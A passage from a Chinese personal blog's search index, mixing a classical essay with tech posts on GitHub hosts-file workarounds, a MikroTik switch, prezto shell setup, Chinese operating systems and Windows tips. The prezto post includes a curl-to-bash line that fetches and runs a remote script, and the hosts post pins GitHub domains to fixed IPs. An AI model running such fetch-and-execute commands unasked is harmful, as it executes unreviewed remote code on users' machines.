文章冠世，孔子尚厄于陈邦。武略超群，太公曾钓于渭水。颜回命短，岂是凶暴之徒。盗柘年长，自非贤良之辈。帝尧天圣，却养不肖之男。瞽叟顽嚣，反生大孝之子。甘罗十二为宰相，买臣五十作公卿。晏婴身长五尺，封为齐国宰相。韩信力无缚鸡，立为汉朝贤臣，未遇之时，口无一日瓮飧，及至兴通，身受齐王将印，吓燕取赵，统百万雄兵，一旦时休，卒于阴人之毒手。李广有射虎之威，到老无封。冯唐有安邦之志，一世无遇。 　上古圣贤，不掌阴阳之数。今日儒士，岂离否泰之中。腰金衣紫，都生贫贱之家。草履毛鞋，都是富豪之裔。有贫贱，而后有富贵。有小壮，而后有老衰。人能学积善，家有余庆。青春美女，反招愚独之夫。俊秀才郎，竟配丑貌之妇。五男二女，老来一身全无。万贯千金，死后离乡别井。才疏学浅，少年及第登科。满腹文章，到老终身不第。或富贵，或贫贱，皆由命理注定。 　若天不得时，则日月无光。地不得时，则草木不生。水不得时，则波浪不静。人不得时，则命运不通。若无根本八字，岂能为卿为相。一生皆由命，半点不由人。 　蜈蚣多足，不及蛇灵。雄鸡有翼，飞不及鸦。马有千里之驰，非人不能自往。人有千般巧计，无运不能自达。 　吾敬为此劝世文也。 ","date":"2021-10-28","objectID":"/zh-cn/26/:0:0","tags":["古诗词歌赋"],"title":"破窑赋","uri":"/zh-cn/26/"},{"categories":["技巧","网络"],"content":"解决GitHub网页githubusercontent地址无法访问问题 解决GitHub网页githubusercontent地址无法访问问题 不知道什么时候开始，GitHub里面的图片也无法加载出来，本来页面也加载缓慢，这下更是雪上加霜，好在还是有简单的方式加速GitHub的访问。 通过设置hosts就是一个低成本的方案， GitHub里面图片都在githubusercontent.com域名下，我们只需要在hosts里绑定域名和对应的IP。 ","date":"2021-10-28","objectID":"/zh-cn/25/:0:0","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"1. hosts内容 hosts文件内容如下： # 2020年12月30日更新 # GitHub Start 52.74.223.119 github.com 52.74.223.119 gist.github.com 54.169.195.247 api.github.com 185.199.111.153 assets-cdn.github.com 199.232.96.133 raw.githubusercontent.com 199.232.96.133 gist.githubusercontent.com 199.232.96.133 cloud.githubusercontent.com 199.232.96.133 camo.githubusercontent.com 199.232.96.133 avatars0.githubusercontent.com 199.232.96.133 avatars1.githubusercontent.com 199.232.96.133 avatars2.githubusercontent.com 199.232.96.133 avatars3.githubusercontent.com 199.232.96.133 avatars4.githubusercontent.com 199.232.96.133 avatars5.githubusercontent.com 199.232.96.133 avatars6.githubusercontent.com 199.232.96.133 avatars7.githubusercontent.com 199.232.96.133 avatars8.githubusercontent.com 199.232.96.133 user-images.githubusercontent.com 185.199.109.154 github.githubassets.com # GitHub End 如果发现没有作用，或者速度不理想，参考查找IP更新下对应的IP地址。 现在有了增强版教程，访问下面链接可以获取最新的地址，再也不用手动查询： ineo6：GitHub加速指南进阶版24 赞同 · 1 评论文章 ","date":"2021-10-28","objectID":"/zh-cn/25/:1:0","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"2. 如何修改 hosts 这里推荐使用 SwitchHosts! 配置hosts，操作很简单，支持跨平台。 复制前面的hosts内容到软件里配置即可，相关介绍参考下面文章。 SwitchHosts! 还能这样管理hosts，后悔没早点用mp.weixin.qq.com/s/A37XnD3HdcGSWUflj6JujQ ","date":"2021-10-28","objectID":"/zh-cn/25/:2:0","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"2.1 Windows hosts文件位置：C:/windows/system32/drivers/etc/hosts。 将前文内容追加到hosts，然后刷新DNS缓存： ipconfig /flushdns ","date":"2021-10-28","objectID":"/zh-cn/25/:2:1","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"2.2 macOS hosts文件位置：/etc/hosts。 macOS系统下修改需要按照如下方式： ","date":"2021-10-28","objectID":"/zh-cn/25/:2:2","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"1：首先，打开（访达）Finder。 ","date":"2021-10-28","objectID":"/zh-cn/25/:2:3","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"2：使用组合键Shift+Command+G打开\"前往文件夹\"，输入框中输入/etc/hosts。 ","date":"2021-10-28","objectID":"/zh-cn/25/:2:4","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"3：然后就会跳转到hosts文件位置。 注意：如果你使用VS Code，可以直接用VS Code修改和保存。 复制hosts文件到桌面上，鼠标右键右击它，选择「打开方式」—「文本编辑」，打开这个hosts文件，然后将你要修改的内容直接在里面修改就好了。 然后把你修改好的hosts文件替换掉：/etc/hosts 文件。 注意：如果弹出密码输入框，你需要输入你当前电脑登录账号的密码。 最后刷新缓存： sudo killall -HUP mDNSResponder ","date":"2021-10-28","objectID":"/zh-cn/25/:2:5","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"3. 查找IP http://tool.chinaz.com/dns https://site.ip138.com https://www.ipaddress.com 注：2020年12月30日我实际使用IPAddress才可以生效，前面两个查询站点获取的IP均无法使用，各位可以都尝试下直到生效。 前面hosts里面域名里分为两类： - .http://githubusercontent.com - .http://github.com *.githubusercontent.com可以使用同一个IP，不需要每个单独查询。*.github.com未经测试，目前看是需要单独查询对应的IP。 ","date":"2021-10-28","objectID":"/zh-cn/25/:3:0","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"其他方案 ","date":"2021-10-28","objectID":"/zh-cn/25/:4:0","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"镜像站点 https://github.com.cnpmjs.org https://hub.fastgit.org 这两个网站是整站访问的替代品，你可以浏览项目，也支持下载检出。 但是不建议登陆自己的账号，毕竟不是直接访问到原站。 ","date":"2021-10-28","objectID":"/zh-cn/25/:4:1","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"文件下载 https://ghproxy.com https://gh.api.99988866.xyz 该方案利用Cloudflare Workers对 release 、archive以及项目文件进行加速，部署无需服务器。 如果对自建感兴趣，可以访问gh-proxy。 ","date":"2021-10-28","objectID":"/zh-cn/25/:4:2","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["技巧","网络"],"content":"Raw加速 https://7ed.net/gra jsDelivr jsDelivr不支持exe文件下载，使用方法参考例子。 地址格式如下，version忽略则始终使用最新版本： https://cdn.jsdelivr.net/gh/user/repo@version/file 举个例子： # 原始url https://github.com/ineo6/homebrew-install/blob/master/install.sh # 转换结果 https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh ","date":"2021-10-28","objectID":"/zh-cn/25/:4:3","tags":["技巧","网络"],"title":"解决GitHub网页githubusercontent地址无法访问问题","uri":"/zh-cn/25/"},{"categories":["网络设备","交换机"],"content":"MikroTik CRS309-1G-8S+IN 万兆交换机简单上手 MikroTik CRS309-1G-8S+IN 万兆交换机简单上手 开箱 上机 配置 测试 传输速度 链路聚合 vLAN 克隆 mac 开箱 上机 配置 将来自路由器的网线通过模块接到交换机上，并把其他两个设备通过直连线也接上，不需要做任何操作就可以直接使用了。默认就是普通数据交换。 为了保证最大的文件传输速度，要改下 L2 MTU 到 9000，下面简单说下交换机和电脑的设置方法 用 MAC 地址登录到交换机 在 Interfaces 里找到活跃的接口，双击，修改 L2 MTU 到 9000 对于 Windows，使用下面的命令修改 MTU netsh interface ipv4 set subinterface \"需修改的连接名\" mtu=9000 store=persistent Intel 网卡设置里有个巨型帧我不确定要不要改，我这边是改了的 对于 macOS，打开 系统偏好设置 - 网络 - 万兆网卡 - 高级… - 硬件，把 MTU 改成 特大(9000) 测试 ","date":"2021-10-24","objectID":"/zh-cn/24-1/:0:0","tags":["网络设备","交换机"],"title":"MikroTik CRS309-1G-8S+IN 万兆交换机简单上手","uri":"/zh-cn/24-1/"},{"categories":["网络设备","交换机"],"content":"传输速度 这边使用磁盘测试工具测试传输速度，可以看到速度都可以几近跑满 10Gbps，没啥大问题 ","date":"2021-10-24","objectID":"/zh-cn/24-1/:1:0","tags":["网络设备","交换机"],"title":"MikroTik CRS309-1G-8S+IN 万兆交换机简单上手","uri":"/zh-cn/24-1/"},{"categories":["网络设备","交换机"],"content":"链路聚合 先把默认 bridge 里需要聚合的两个网口删掉 添加 Bonding，我这里模式选的 802.3ad 最后，再把这个 Bonding 给加回去 Bridge ","date":"2021-10-24","objectID":"/zh-cn/24-1/:2:0","tags":["网络设备","交换机"],"title":"MikroTik CRS309-1G-8S+IN 万兆交换机简单上手","uri":"/zh-cn/24-1/"},{"categories":["网络设备","交换机"],"content":"vLAN 设备不够多，回头再测。 ","date":"2021-10-24","objectID":"/zh-cn/24-1/:3:0","tags":["网络设备","交换机"],"title":"MikroTik CRS309-1G-8S+IN 万兆交换机简单上手","uri":"/zh-cn/24-1/"},{"categories":["网络设备","交换机"],"content":"克隆 mac 想定是把 Xbox Series X 的 mac 地址克隆给 PC，这样应该可以用加速盒子加速了。但是还缺一个光电模块，回头再测。 ","date":"2021-10-24","objectID":"/zh-cn/24-1/:4:0","tags":["网络设备","交换机"],"title":"MikroTik CRS309-1G-8S+IN 万兆交换机简单上手","uri":"/zh-cn/24-1/"},{"categories":["应用","软件","工具"],"content":"从 oh-my-zsh 到 prezto 从 oh-my-zsh 到 prezto 从 oh-my-zsh 到 prezto ","date":"2021-10-24","objectID":"/zh-cn/24/:0:0","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"一、为什么切换？ 在一开始接触 oh-my-zsh 的时候说实话只是因为它的主题非常漂亮，例如 powerlevel10k 主题；这对于一个常年在终端上锻炼左右手的人来说确实是非常 “Sexy”。后来随着逐渐深度使用，oh-my-zsh 深度集成的这种一体化插件方案等确实带来了极大便利；例如简单的命令行搜索、git、docker、kuebctl 等各种插件的快速提示等。 但是当终端使用久了以后突然发现，其实像 powerlevel10k 这种花哨的终端主题并不适合我；当逐渐切换回简洁的一些主题，并在 Kubernetes 等大项目的目录下左右横跳时，oh-my-zsh 极慢的响应速度开始展露弊端；仅仅在 Kubernetes 的 Git 仓库目录下，按住回车键终端都能卡出动画… 所以当忍受不了终端这种拉垮的响应速度时，我感觉是时候换一个了。 ","date":"2021-10-24","objectID":"/zh-cn/24/:1:0","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"二、Prezto 介绍 Prezto 官方仓库的介绍很简单，简单到只说 Prezto 是一个 zsh 配置框架，集成了一些主题、插件等。但是如果细说的话，其实 Prezto 最早应该是 oh-my-zsh 的 fork 版本，然后 Prezto 被一点点重写，现在已经基本看不到 oh-my-zsh 的影子了。不过唯一可以肯定的是，性能以及易用性上比 oh-my-zsh 好得多。 Prezto has been rewritten by the author who wanted to achieve a good zsh setup by ensuring all the scripts are making use of zsh syntax. It has a few more steps to install but should only take a few minutes extra. —- John Stevenson ","date":"2021-10-24","objectID":"/zh-cn/24/:2:0","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"三、Prezto 安装 Prezto 安装按照仓库文档的方法安装即可: ","date":"2021-10-24","objectID":"/zh-cn/24/:3:0","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"3.1、zsh 安装 首先确定已经安装了 zsh，如果没有安装则需要通过相应系统的包管理器等工具进行安装: # macOS(最新版本的 macOS 已经默认安装了 zsh) brew install zsh # Ubuntu apt install zsh -yCopy ","date":"2021-10-24","objectID":"/zh-cn/24/:3:1","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"3.2、克隆仓库 在仓库进行克隆时一般分为两种情况，一种默认克隆到 \"${ZDOTDIR:-$HOME}/.zprezto\" 目录(标准安装): git clone --recursive https://github.com/sorin-ionescu/prezto.git \"${ZDOTDIR:-$HOME}/.zprezto\"Copy 另一种高级用户可能使用 XDG_CONFIG_HOME 配置: # 克隆仓库 git clone --recursive https://github.com/sorin-ionescu/prezto.git \"${ZDOTDIR:-${XDG_CONFIG_HOME:-$HOME/.config}/zsh}/.zprezto\" # 调整 Prezto 的 XDG_CONFIG_HOME 配置 # 该配置需要写入到 $HOME/.zshenv 中 export XDG_CONFIG_HOME=\"${XDG_CONFIG_HOME:=$HOME/.config}\" export ZDOTDIR=\"${ZDOTDIR:=$XDG_CONFIG_HOME/zsh}\" source \"$ZDOTDIR/.zshenv\"Copy ","date":"2021-10-24","objectID":"/zh-cn/24/:3:2","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"3.3、创建软连接 Prezto 的安装方式比较方便定制化，在主仓库克隆完成后，只需要将相关的初始化加载配置软连接到 $HOME 目录即可: setopt EXTENDED_GLOB for rcfile in \"${ZDOTDIR:-$HOME}\"/.zprezto/runcoms/^README.md(.N); do ln -s \"$rcfile\" \"${ZDOTDIR:-$HOME}/.${rcfile:t}\" doneCopy 不过需要注意的是上面的命令在某些 shell 脚本里直接写可能会有兼容性问题，在这种情况下可以直接通过命令进行简单处理: for rcfile in $(ls ${ZDOTDIR:-$HOME}/.zprezto/runcoms/* | xargs -n 1 basename | grep -v README); do target=\"${ZDOTDIR:-$HOME}/.${rcfile:t}\" ln -s \"${ZDOTDIR:-$HOME}/.zprezto/runcoms/${rcfile}\" \"${target}\" doneCopy 至此，Prezto 算是安装完成，重新登录 shell 即可看到效果。 ","date":"2021-10-24","objectID":"/zh-cn/24/:3:3","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"四、细节调整 ","date":"2021-10-24","objectID":"/zh-cn/24/:4:0","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"4.1、更换主题 默认情况下 Prezto 使用 sorin 这个主题，如果对默认主题不满意可以通过 prompt 命令切换: # 列出当前支持的主题 prompt -l # 直接在命令行上展示所有主题样式(预览) prompt -p # 临时试用某个主题 prompt 主题名称 # 保存该主题到配置中(使用) prompt -s 主题名称Copy ","date":"2021-10-24","objectID":"/zh-cn/24/:4:1","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"4.2、grep 高亮 默认情况下 Prezto 在执行 grep 时会对结果进行高亮处理，在某些终端主题上可能会很影响观感: grep 高亮是在 utility 插件中被开启的，可以通过在 ~/.zpreztorc 中增加以下配置关闭: zstyle ':prezto:module:utility:grep' color 'no'Copy ","date":"2021-10-24","objectID":"/zh-cn/24/:4:2","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"4.3、命令、语法高亮 Prezto 通过 syntax-highlighting 插件提供了各种语法高亮配置，通过解开以下配置的注释开启更多的自动高亮: # Set syntax highlighters. # By default, only the main highlighter is enabled. zstyle ':prezto:module:syntax-highlighting' highlighters \\ 'main' \\ 'brackets' \\ 'pattern' \\ 'line' \\ 'cursor' \\ 'root'Copy 需要注意的是，默认 root 高亮开启后，root 用户所有执行命令都会高亮，这样可能在主题配色上导致看不清输入的命令，可以简单的移除 root 高亮配置即可。 ","date":"2021-10-24","objectID":"/zh-cn/24/:4:3","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"4.4、自定义命令高亮 在 syntax-highlighting 插件中启用了 pattern 高亮后，可以通过以下配置设置一些自定义的命令高亮配置，例如 rm -rf 等: # Set syntax pattern styles. zstyle ':prezto:module:syntax-highlighting' pattern \\ 'rm*-rf*' 'fg=white,bold,bg=red'Copy ","date":"2021-10-24","objectID":"/zh-cn/24/:4:4","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"4.5、历史命令搜索 oh-my-zsh 通过上下箭头按键来快速搜索历史命令是一个非常实用的功能，在切换到 Perzto 后会发现上下箭头的搜索变成了全命令的模糊匹配；例如输入 vim 然后上下翻页会匹配到位于命令中间带有 vim 字样的历史命令: 解决这个问题需要将 history-substring-search 插件依赖的 zsh-history-substring-search 切换到 master 分支并增加 HISTORY_SUBSTRING_SEARCH_PREFIXED 变量配置: # 切换 zsh-history-substring-search 到 master 分支 (cd ~/.zprezto/modules/history-substring-search/external \u0026\u0026 git checkout master) # 在 ~/.zshrc 中增加环境变量配置 export HISTORY_SUBSTRING_SEARCH_PREFIXED=trueCopy 同时历史搜索里还有一个问题是同样的命令如果出现多次会被多次匹配，解决这个问题需要增加以下变量: export HISTORY_SUBSTRING_SEARCH_ENSURE_UNIQUE=trueCopy ","date":"2021-10-24","objectID":"/zh-cn/24/:4:5","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["应用","软件","工具"],"content":"五、其他插件 更多可以使用的插件请参考 modules 目录下每个插件的文档，以及如何开启和配置。 为了方便自己使用，我在我的 init 项目下创建了快速初始化脚本，以上这些调整将自动完成: curl https://raw.githubusercontent.com/mritd/init/master/prezto/init.sh | bash ","date":"2021-10-24","objectID":"/zh-cn/24/:5:0","tags":["应用","软件","工具"],"title":"从 oh-my-zsh 到 prezto ","uri":"/zh-cn/24/"},{"categories":["操作系统"],"content":"国产操作系统收集 国产操作系统收集 收集一些国产操作系统，银河麒麟用过一段时间，只有一个软件源，使用过程中出现很多问题 ——Linux系—— 中科红旗 Red Flag （基于rpm系linux，已倒闭） 珠穆朗玛操作系统 Qomo Linux（基于rpm系linux，红旗社区版） 中标普华 I-soft OS （和银河麒麟部分合并为中标麒麟） 优麒麟 Ubuntu Kylin（基于ubuntu） 中标麒麟 NeoKylin （基于rpm系linux） 雨林木风操作系统 YLMFOS（基于ubuntu，5.0改名startos） 起点操作系统 StartOS （已经暂停项目） 深度操作系统 Deepin （2014基于ubuntu） 魔法linux（已经停止开发） 蓝点linux（已倒闭） 宝龙XOS Bolod XOS（基于debian） 中国操作系统PC版 chinaos （基于linux mint,可能是非官方发布的,完全改图标而已） 威科乐恩Linux WiOS 凝思磐石安全操作系统 思普操作系统 SPGnux 共创桌面操作系统 新支点linux 核弹linux （已经停止开发） PrayayaQ3 新华华镭 昆仑Linux 360急救盘（基于puppy linux，非工作的，急救用的操作系统） —–BSD系—– 银河麒麟 KylinOS （疑似基于freebsd） —-30DayOS系—- 天润操作系统 TianrunOS —-完全自主开发—- 都江堰操作系统 aCoral（嵌入式） RT-Thread（嵌入式） DeltaKVM（嵌入式） HBOS（嵌入式） DeltaOS Hopen OS —–尚不清楚的—— 睿欧 Raspberrypi Idev Os 指尖操作系统 ","date":"2021-10-23","objectID":"/zh-cn/23-2/:0:0","tags":["操作系统"],"title":"国产操作系统收集","uri":"/zh-cn/23-2/"},{"categories":["操作系统"],"content":"2021年度流行的国产系统列表： 1.深度Linux（deepin） 2.安超OS（国产通用型云操作系统） 3.优麒麟（UbuntuKylin）（由中国CCN联合实验室支持和主导的开源项目） 4.中标麒麟（NeoKylin）；（银河麒麟与中标普华已在2010年12月16日宣布合并品牌） 5.威科乐恩Linux（WiOS） 6.起点操作系统（StartOS 原雨林木风OS）； 7.凝思磐石安全操作系统； 8.共创Linux； [1] 9.思普操作系统； 10.中科方德桌面操作系统 11.普华Linux（I-soft OS）； 12.RT-Thread RTOS 13.中兴新支点操作系统 14.一铭操作系统 15.springLinux 16.红旗 linux（redflag linux） [2] 17.Veket Linux 18.UOS（统信操作系统） [3] 19.AliOS（阿里云系统）（原Yun OS） [4] 20.PhoenixOS（凤凰系统） [5] 21.JideOS（技德系统）（原remixOS） [6] 22.HopeEdgeOS（面向物联网领域操作系统） [7] 23.openEuler 24.鸿蒙 Harmony OS —–声称非android的移动操作系统—— 960os chna os 中标灵巧 ","date":"2021-10-23","objectID":"/zh-cn/23-2/:1:0","tags":["操作系统"],"title":"国产操作系统收集","uri":"/zh-cn/23-2/"},{"categories":["Windows","系统"],"content":"Windows 使用技巧 Windows 使用技巧 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:0:0","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"快捷键 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:1:0","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"系统 Win-E：打开系统文件浏览器 Win-Tab：打开程序网格面板，类似于 C-Tab，但默认不会切换，而是展开全屏面板选择一个正在运行的程序切换过去 Win-R：打开运行 Win-S：搜索任何东西 Win-A：展开右侧通知面板 C-Tab：切换程序 CS-Esc：打开任务管理器 C-F ：在当前页内容中搜索关键字 Enter：下一个匹配关键字 S-Enter：上一个匹配关键字 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:1:1","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"非常见 C-空格：切换半角/全角标点符号 C-.：切换中英文标点符号（隐藏的很深。。。） Win-长按: 显示快捷键指南 Win-Top: 最大化 Win-Down: 最小化 Win-Left: 左侧贴靠 Win-Left: 右侧贴靠 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:1:2","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"删除系统快捷键 以下输入法会影响到 IDE 使用，需要禁用 系统 输入法 1623122443753 CS-F: 输入法简繁体切换 C-空格: 中英文切换 QQ 1623122471651 CA-S: 屏幕录制 CA-O: 屏幕识图 F6: 群通话按住发言 CA-F: 屏幕翻译 建议使用 OpenArk 查找快捷键占用的问题 1623122585291 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:1:3","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"高级功能 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:2:0","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"定时关机 使用以下命令会在指定时间后关机 shutdown –s –t [second time]Copy 例如以下命令指的是在 1h 后关机 shutdown –s –t 3600Copy 参考: 百度 win10 怎么定时关机？ ","date":"2021-10-23","objectID":"/zh-cn/23-1/:2:1","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"PowerToys 使用 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:2:2","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"Windows 为当前用户添加开机自启项 每次打开电脑，开机之后总是要启动 Chrome 浏览器等一些常用应用，而常用应用中有的有开机自启的选项，有些则没有。每次打开都是重复性的操作，真是不厌其烦。。。 下面是 Windows 当前用户的自启动目录的路径 C:\\Users\\{你的用户名}\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\StartupCopy 我们可以为想要自启动的程序创建一个快捷方式，然后将快捷方式放到这个目录下就可以啦 然而，直接放快捷方式太多的话管理起来可能会是个麻烦，所以我们可以使用脚本，下面给出两种脚本示例 ahk 脚本 ; 开机自启 Chrome 浏览器 Run ChromeCopy cmd 脚本 rem 开机自启 Chrome 浏览器 start chromeCopy ","date":"2021-10-23","objectID":"/zh-cn/23-1/:2:3","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"cmd 命令提示符工具文件所在路径？ where cmdCopy 参考：知乎：cmd 命令提示符工具文件所在路径？ ","date":"2021-10-23","objectID":"/zh-cn/23-1/:2:4","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"隐藏桌面系统图标 1623386196951 参考：显示或隐藏回收站 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:2:5","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"SSR 存在时无法打开 Microsoft Store 等 UWP 应用 今天突然发现打不开 Microsoft Store，一直卡在请求界面。因为之前遇到过几次打不开 Microsoft Store 的情况，所以知道大概率又是代理的问题。查了下资料，终于彻底（~ 存疑~）解决了这个问题。 原因 UWP 有沙箱的安全机制，无法连接到 127.0.0.1 解决方法 为所有 UWP 应用单独设置代理，以管理员身份启动 PowerShell（win+x 后按 a）后运行下列命令： foreach($f in Get-ChildItem $env:LOCALAPPDATA\\Packages) {CheckNetIsolation.exe LoopbackExempt -a \"-n=$($f.Name)\"}Copy ","date":"2021-10-23","objectID":"/zh-cn/23-1/:2:6","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"开发 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:3:0","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"设置正确的开发所需网络环境 动机 在国内网络环境中，开发是一件比较痛苦的事情，尤其是各种依赖，包括但不限于 Linux 包、NPM、GitHub、Maven 等等，都慢的让人心态爆炸。 对于前端而言，就是 npm 包下载二进制文件容易卡死的问题 步骤 购买一个代理服务，参考：[DuyaoSS - 机场测速和简介 SS/SSR/V2Ray] 【联通】更新中 使用 SSR 客户端 使用 Proxifier 透明代理客户端，它能从系统级别强制让程序走代理，目前支持 win/mac 自定义 DNS：使用世界上最好的 1.1.1.1 代替默认的 DNS 代理服务的稳定和价格只能二选其一，速度不是核心因素，因为大多数代理服务的速度都能够满足常用需求（例如 youtube 观看视频流畅），再提高会出现边际效应。 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:3:1","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"下载 windows 10 镜像 windows 开发镜像 有时候需要在虚拟机中测试，而微软官方提供了封装好的虚拟机镜像，包括流行的 VMWare/Hyper-V/VirtualBox/Parallels。 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:3:2","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"安装 Build Tools for Visual Studio 2019 主要是处理一些二进制依赖，例如 imagemin-pngquant 解决方案 1 在管理员模式下运行以下命令 npm install --global --production windows-build-toolsCopy 参考: https://github.com/antvis/L7/issues/101，吾辈使用这种方法没有安装成功 解决方案 2 从 这里 下载 Build Tools for Visual Studio 2019 安装器 在 tab 可用 下选择 Visual Studio 生成工具 2019 =\u003e 使用 C++ 的桌面开发 安装 ","date":"2021-10-23","objectID":"/zh-cn/23-1/:3:3","tags":["Windows","系统"],"title":"Windows 使用技巧","uri":"/zh-cn/23-1/"},{"categories":["Windows","系统"],"content":"Windows恢复环境Windows RE Windows恢复环境Windows RE ","date":"2021-10-23","objectID":"/zh-cn/23/:0:0","tags":["Windows","系统"],"title":"Windows恢复环境Windows RE","uri":"/zh-cn/23/"},{"categories":["Windows","系统"],"content":"reagentc 命令 reagentc /disable 禁用windowsRE reagentc /enable 启用windowsRE reagentc /info 查看windowsRE状态 reagentc /boottore 将系统配置为在下次系统启动时启动 Windows RE ","date":"2021-10-23","objectID":"/zh-cn/23/:1:0","tags":["Windows","系统"],"title":"Windows恢复环境Windows RE","uri":"/zh-cn/23/"},{"categories":["Windows","系统"],"content":"重新启用windowsRE 因为各种原因，使用 reagentc /info 查看发现RE已经没有了，可以手动创建RE windows原版ISO镜像，打开其中的sources目录，用解压缩软件打开install.wim文件，然后再定位到windows/system32/recovery目录，提取 WinRE.wim 到 Recovery 分区 x:\\Recovery\\WindowsRE 然后执行： reagentc /setreimage /path x:\\Recovery\\WindowsRE ","date":"2021-10-23","objectID":"/zh-cn/23/:2:0","tags":["Windows","系统"],"title":"Windows恢复环境Windows RE","uri":"/zh-cn/23/"},{"categories":["Apple","MacOS","系统"],"content":"Mac OS 上的平铺窗口管理工具 yabai 纯键盘操作的 macOS 平铺式窗口管理器 - yabai 在 macOS 上，已经有不少各具特色的窗口管理器，例如 Magnet, Moom 等。不过，这些窗口管理器，都或多或少地依赖一些鼠标/触控板操作。 对于 Linux, 存在着另一种窗口管理工具：平铺式窗口管理器。常见的 awesome 和 i3, 都有着各自忠实的用户。 而前段时间出现的开源软件 yabai, 为 macOS 带来了平铺式窗口管理器。本文将对 yabai 的安装和使用做一个初步的介绍。 使用 yabai 管理的 macOS 桌面 